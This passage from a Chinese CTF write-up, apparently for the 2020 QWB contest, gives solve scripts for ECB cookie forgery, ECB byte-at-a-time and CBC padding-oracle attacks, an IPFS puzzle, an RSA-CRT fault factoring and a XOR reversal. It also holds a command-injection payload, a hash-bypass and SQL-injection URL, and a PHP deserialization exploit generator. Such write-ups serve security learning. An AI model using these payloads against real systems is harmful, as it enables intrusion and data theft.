class="line">    <span class="comment"># print(plain1.hex(), plain2.hex())</span></span><br><span class="line">    <span class="comment"># xor_vector = xor(b&quot;11&quot;*16, plain2)</span></span><br><span class="line">    <span class="comment"># iv = xor(xor_vector, plain1)</span></span><br><span class="line">    <span class="comment"># print(iv) # b&#x27;\x8c t\xeb\x83\xfb\x1c\xac\xfa\xa4hk&#123;\xbe\xcf|&#x27;</span></span><br><span class="line"></span><br><span class="line">    iv = <span class="string">b&#x27;\x8c t\xeb\x83\xfb\x1c\xac\xfa\xa4hk&#123;\xbe\xcf|&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Challenge2 IV: <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Challenge2 sha256(IV): <span class="subst">&#123;sha256(iv).hexdigest()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>) <span class="comment"># guess iv</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;iv(encode hex):&quot;</span>, iv.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_3</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 3\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;128bit_ecb_encrypt(cookie):&quot;</span>)</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(r.recvline().strip().decode())</span><br><span class="line">    c1 = cipher[:<span class="number">16</span>]    <span class="comment"># session:e8766bf7</span></span><br><span class="line">    c2 = cipher[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># ;timedl=1;admin=</span></span><br><span class="line">    c3 = cipher[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 0;guess_cookie_m</span></span><br><span class="line">    c4 = cipher[<span class="number">48</span>:<span class="number">64</span>]  <span class="comment"># a=1;guess_mp_ab=</span></span><br><span class="line">    c5 = cipher[<span class="number">64</span>:<span class="number">80</span>]  <span class="comment"># 1;guess_cookie_m</span></span><br><span class="line">    c6 = cipher[<span class="number">80</span>:<span class="number">96</span>]  <span class="comment"># b=0;hell_pad=233</span></span><br><span class="line"></span><br><span class="line">    payload = c1 + c2 + c5 + c4 + c5 + c6</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;input your encrypted cookie(encode hex):&quot;</span>, payload.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_4</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 4\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    secret = <span class="string">b&quot;i\x87Z\x029\x94\x90\xaagr\x18&lt;m*\x81\x0f&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>-<span class="built_in">len</span>(secret), <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        inp = <span class="string">b&quot;1&quot;</span>*(i-<span class="number">1</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>, inp.<span class="built_in">hex</span>().encode())</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;before encrypted:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.recvline())</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">        cipher = r.recvline().decode().strip()[:<span class="number">32</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;cipher: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            r.sendlineafter(<span class="string">b&quot;input(encode hex):&quot;</span>, (inp + secret + <span class="built_in">bytes</span>([j])).<span class="built_in">hex</span>().encode())</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;encrypted msg: &quot;</span>)</span><br><span class="line">            c = r.recvline().decode().strip()[:<span class="number">32</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c: <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> cipher <span class="keyword">in</span> c:</span><br><span class="line">                secret += <span class="built_in">bytes</span>([j])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r.close()</span><br><span class="line">        <span class="built_in">print</span>(i, secret)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>) <span class="comment"># secert</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;secret&quot;</span>, secret.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_5</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 5\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hexdigest = &quot;deb36c8f64034db192a896fb067f381240a1edd776c07f31b1bef33ec3998e6e&quot;</span></span><br><span class="line">    <span class="comment"># encrypt_secret = &quot;75b1c0ebc5dfcabe784ea85ee2a28a52&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># table = dict()</span></span><br><span class="line">    <span class="comment"># for i in range(0, 256**2, 256):</span></span><br><span class="line">    <span class="comment">#     payload = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#     for j in range(i, i+256):</span></span><br><span class="line">    <span class="comment">#         payload += hex(j)[2:].zfill(4)</span></span><br><span class="line">    <span class="comment">#     r.sendlineafter(b&quot;your choice:&quot;, b&quot;1&quot;)</span></span><br><span class="line">    <span class="comment">#     r.sendlineafter(b&quot;input(encode hex):&quot;, payload.encode())</span></span><br><span class="line">    <span class="comment">#     r.recvuntil(b&#x27;myblockencrypt_ecb(your_input).encode(&quot;hex&quot;):&#x27;)</span></span><br><span class="line">    <span class="comment">#     cipher = r.recvline().strip().decode()</span></span><br><span class="line">    <span class="comment">#     for k, j in enumerate(range(i, i+256)):</span></span><br><span class="line">    <span class="comment">#         table[cipher[k*4:k*4+4]] = hex(j)[2:].zfill(4)</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(0, len(encrypt_secret), 4):</span></span><br><span class="line">    <span class="comment">#     secret += table[encrypt_secret[i:i+4]]</span></span><br><span class="line">    <span class="comment"># print(secret)</span></span><br><span class="line">    secret = <span class="string">&#x27;cdf3ff86aeb04a7fdb1614043964349c&#x27;</span></span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>) <span class="comment"># secert</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;secret&quot;</span>, secret.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_6</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 6\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;31313131313131313131313131313131&quot;</span>)</span><br><span class="line">    c1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;ab852396af79701989fdeafca2e8a5457db6307920981252c49622d9c5428917&quot;</span>)[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    secret = <span class="string">b&#x27;M\x1fC^\xbc\x8f&#125;N\xc4\x06lG\x16\xa9\xbdS&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>-<span class="built_in">len</span>(secret), -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line">            new_iv = xor(iv, <span class="string">b&quot;\x00&quot;</span>*i + <span class="built_in">bytes</span>([j]) + xor(secret, <span class="built_in">bytes</span>([<span class="number">16</span>-i])*(<span class="number">16</span>-i)))</span><br><span class="line">            payload = new_iv + c1</span><br><span class="line">            r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            r.sendlineafter(<span class="string">b&quot;input your iv+c (encode hex):&quot;</span>, payload.<span class="built_in">hex</span>().encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> r.recvline():</span><br><span class="line">                secret = <span class="built_in">bytes</span>([(<span class="number">16</span>-i) ^ j]) + secret</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r.close()</span><br><span class="line">        <span class="built_in">print</span>(i, secret)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>) <span class="comment"># secert</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;secret&quot;</span>, secret.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve_1()</span><br><span class="line">solve_2()</span><br><span class="line">solve_3()</span><br><span class="line">solve_4()</span><br><span class="line">solve_5()</span><br><span class="line">solve_6()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png"></p>
<h2><span id="blockchain">Blockchain</span><a href="#blockchain" class="header-anchor"></a></h2><h3><span id="ipfs">IPFS</span><a href="#ipfs" class="header-anchor"></a></h3><p>可以通过命令<code>ipfs cat &lt;hash&gt; &gt; i.data</code>把pic1.jpg的6块block给下载下来，很明显第4条hash对应jpg文件的开头，第5条hash对应jpg文件的结尾</p>
<p>剩余的4块可以穷举拼接一下，看能不能恢复成正常的图形：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutation</span><br><span class="line"></span><br><span class="line">pics = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    pics.append(<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.data&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> perm <span class="keyword">in</span> permutations([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>], <span class="number">4</span>):</span><br><span class="line">    data = pics[<span class="number">3</span>] <span class="comment"># 4th hash</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> perm:</span><br><span class="line">        data += pics[i]</span><br><span class="line">    data += pics[<span class="number">4</span>] <span class="comment"># 5th hash</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> perm)&#125;</span>.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>

<p>发现0213.jpg可以正常显示：</p>
<p><img src="https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png" alt="Screen Shot 2020-08-23 at 2.32.56 AM"></p>
<p>pic2.jpg，给出了文件的sha256sum，根据QmHash的格式，可以得到pic2.jpg的QmHash：</p>
<p><img src="https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png" alt="image-20200823023341028"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base58.b58encode(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1220&quot;</span>+<span class="string">&quot;659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e&quot;</span>)))</span><br><span class="line"><span class="comment"># b&#x27;QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>ipfs cat QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 &gt; pic2.jpg</code>可以得到第二张图片：</p>
<p><img src="https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png" alt="Screen Shot 2020-08-23 at 2.36.21 AM"></p>
<p>组合起来就是：<code>flag=flag&#123;md5( hash1 + hash2 )&#125;</code></p>
<p>hash2已经有了：QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3</p>
<p>hash1可以通过再重新上传pic1.jpg得到。</p>
<p>观察发现出题人上传pic1.jpg时，设置的block-size是26624</p>
<p>看一下<code>ipfs add --help</code>发现能够通过<code>--chunker=size-26624</code>指定block的大小</p>
<p><img src="https://i.loli.net/2020/08/23/1hvuTxL9gWVQJpj.png" alt="Screen Shot 2020-08-23 at 2.39.27 AM"></p>
<p>重新上传得到root hash：QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7</p>
<p>flag{35fb9b3fe44919974a02c26f34369b8e}</p>
<h2><span id="qiang-wang-xian-feng">强网先锋</span><a href="#qiang-wang-xian-feng" class="header-anchor"></a></h2><h3><span id="zhu-dong">主动</span><a href="#zhu-dong" class="header-anchor"></a></h3><p>ip&#x3D;127.0.0.1;cat%20fl\ag.php</p>
<h3><span id="upload">upload</span><a href="#upload" class="header-anchor"></a></h3><p>流量包题</p>
<p>分析流量包可知，上传了一个steghide.jpg文件，将其导出，<code>steghide extract -sf steghide.jpg</code>，密码123456，得到flag.txt</p>
<p>flag{te11_me_y0u_like_it}</p>
<h3><span id="funhash">Funhash</span><a href="#funhash" class="header-anchor"></a></h3><p>web题 <a href="http://39.101.177.96/">http://39.101.177.96/</a><br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.101.177.96/?hash1=0e251288019&amp;hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure>

<h3><span id="web-fu-zhu">web辅助</span><a href="#web-fu-zhu" class="header-anchor"></a></h3><p><a href="http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/">http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/</a><br>签到题，看脚本吧，没什么难度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class topsolo&#123;</span><br><span class="line">    protected $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name = &#x27;Riven&#x27;)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function TP()&#123;</span><br><span class="line">        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;)&#123;</span><br><span class="line">            $name = $this-&gt;name;</span><br><span class="line">            $name();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class midsolo&#123;</span><br><span class="line">    protected $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;name !== &#x27;Yasuo&#x27;)&#123;</span><br><span class="line">            $this-&gt;name = &#x27;Yasuo&#x27;;</span><br><span class="line">            echo &quot;No Yasuo! No Soul!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function Gank()&#123;</span><br><span class="line">        if (stristr($this-&gt;name, &#x27;Yasuo&#x27;))&#123;</span><br><span class="line">            echo &quot;Are you orphan?\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Must Be Yasuo!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class jungle&#123;</span><br><span class="line">    protected $name = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name = &quot;Lee Sin&quot;)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function KS()&#123;</span><br><span class="line">        echo &quot;triggered&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;KS();</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class player&#123;</span><br><span class="line">    protected $user;</span><br><span class="line">    protected $pass;</span><br><span class="line">    protected $admin;</span><br><span class="line"></span><br><span class="line">    public function __construct($user, $pass, $admin = 0)&#123;</span><br><span class="line">        $this-&gt;user = $user;</span><br><span class="line">        $this-&gt;pass = $pass;</span><br><span class="line">        $this-&gt;admin = $admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_admin()&#123;</span><br><span class="line">        return $this-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data)&#123;</span><br><span class="line">    $data = str_replace(&#x27;\0*\0&#x27;, chr(0).&quot;*&quot;.chr(0), $data);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write($data)&#123;</span><br><span class="line">    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#x27;\0*\0&#x27;, $data);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$jungle = new jungle();</span><br><span class="line">$mid = new midsolo($jungle);</span><br><span class="line">$top = new topsolo($mid);</span><br><span class="line"></span><br><span class="line">$exp = serialize($top);</span><br><span class="line">$exp = str_replace(&quot;s:7:\&quot;\x00*\x00name\&quot;&quot;, &#x27;S:7:&quot;\00*\00\6eame&quot;&#x27;, $exp);</span><br><span class="line">echo strlen($exp) . &quot;\n&quot;;</span><br><span class="line">var_dump($exp);</span><br><span class="line"></span><br><span class="line">$username =  str_repeat(&#x27;\0*\0&#x27;, 13) . &#x27;a&#x27;;</span><br><span class="line">$password =  &quot;aaa\&quot;;s:8:\&quot;\0*\0admin\&quot;;&quot; . $exp . &quot;s:7:\&quot;\0*\0user\&quot;;s:2:\&quot;12\&quot;;&#125;&quot;;</span><br><span class="line">$password = str_replace(&#x27;&#125;&#125;&#x27;, &quot;\&quot;s:2:\&quot;zz\&quot;;s:2:\&quot;12\&quot;;&#125;&#125;&quot;, $password);</span><br><span class="line">echo urlencode($username) . &quot;\n&quot;;</span><br><span class="line">echo base64_encode($password) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">//system(&quot;curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=&quot; . urlencode($username) . &quot;&amp;password=&quot; . urlencode($password));</span><br><span class="line">echo &quot;curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=&quot; . urlencode($username) . &quot;&amp;password=&quot; . urlencode($password) . &quot;\n&quot;;</span><br><span class="line">$player = new player($username, $password);</span><br><span class="line"></span><br><span class="line">$dump = write(serialize($player));</span><br><span class="line">$dump = read($dump);</span><br><span class="line">echo base64_encode($dump) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($dump));</span><br><span class="line"></span><br><span class="line">var_dump($dump);</span><br></pre></td></tr></table></figure>


<h3><span id="ce-fang">侧防</span><a href="#ce-fang" class="header-anchor"></a></h3><p>rev<br>xor key后有个换位操作，做对应逆运算即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  a = &#x27;QWBlogs&#x27;</span><br><span class="line">b = [0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,</span><br><span class="line">  0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,</span><br><span class="line">  0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,</span><br><span class="line">  0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</span><br><span class="line">d = [0]*len(b)</span><br><span class="line">c = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(b),4):</span><br><span class="line">    d[i] = b[i+1]</span><br><span class="line">    d[i+1] = b[i+2]</span><br><span class="line">    d[i + 2] = b[i + 3]</span><br><span class="line">    d[i + 3] = b[i]</span><br><span class="line">print d</span><br><span class="line">for i in range(len(b)):</span><br><span class="line">    c += chr((d[i]-65)^ord(a[i%7]))</span><br><span class="line">print c</span><br><span class="line">print len(b)</span><br><span class="line">print len(c)</span><br></pre></td></tr></table></figure>

<h3><span id="baby-crt">baby_crt</span><a href="#baby-crt" class="header-anchor"></a></h3><p>crypto</p>
<p>RSA CRT fault</p>
<p><a href="http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf">http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf</a></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span></span><br><span class="line">m = <span class="number">26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540</span></span><br><span class="line">sigature = <span class="number">20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    g = GCD(<span class="built_in">pow</span>(m, c1, n) - <span class="built_in">pow</span>(sigature, e, n), n)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        p = g</span><br><span class="line">        <span class="built_in">print</span>(c1, g)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line"><span 